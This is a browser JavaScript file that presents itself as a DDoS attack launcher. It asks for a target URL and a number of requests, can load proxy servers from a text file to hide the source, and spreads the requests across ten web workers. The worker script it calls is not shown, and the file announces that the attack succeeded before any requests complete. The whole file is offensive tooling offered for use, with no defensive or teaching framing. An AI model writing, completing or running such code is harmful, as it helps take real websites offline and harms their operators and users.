// Main function to initiate the DDoS attack
function launchDDoS() {
    // Prompt the user to enter the target URL and number of requests
    let targetURL = prompt("Enter the target URL:");
    let numRequests = prompt("Enter the number of requests:");
    let useProxies = confirm("Would you like to use proxy servers for the requests? Click OK to use proxies or Cancel to send requests directly.");

    // Validate input parameters
    if (!targetURL || !numRequests || isNaN(numRequests) || numRequests <= 0) {
        return "Invalid input parameters. Please provide a valid target URL and a positive integer for the number of requests.";
    }

    // Load proxy servers from the external file
    let proxies = [];
    if (useProxies) {
        // Load proxy servers from http.txt file
        let fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.accept = '.txt';

        fileInput.onchange = function(e) {
            let file = e.target.files[0];
            let reader = new FileReader();
            reader.onload = function() {
                proxies = reader.result.split('\n').map(proxy => proxy.trim());
                sendRequests(targetURL, numRequests, proxies);
            };
            reader.readAsText(file);
        };

        fileInput.click();
    } else {
        // Send requests directly to the target URL
        sendRequests(targetURL, numRequests, proxies);
    }

    return "DDoS attack launched successfully. Target: " + targetURL + ", Number of requests: " + numRequests;
}

// Function to send requests to the target URL
function sendRequests(targetURL, numRequests, proxies) {
    // Initialize an array to hold threads
    let threads = [];

    // Create multiple threads for concurrent requests
    for (let i = 0; i < 10; i++) { // Create 10 threads for maximum power
        let thread = new Worker('thread.js'); // Create a new thread (web worker)
        threads.push(thread);
    }

    // Distribute the requests evenly among threads
    let requestsPerThread = Math.ceil(numRequests / threads.length);

    // Send requests from each thread
    threads.forEach(thread => {
        thread.postMessage({ targetURL, numRequests: requestsPerThread, proxies }); // Send message to the thread
    });

    return "DDoS attack launched successfully. Target: " + targetURL + ", Number of requests: " + numRequests;
}

// Example usage
console.log(launchDDoS());
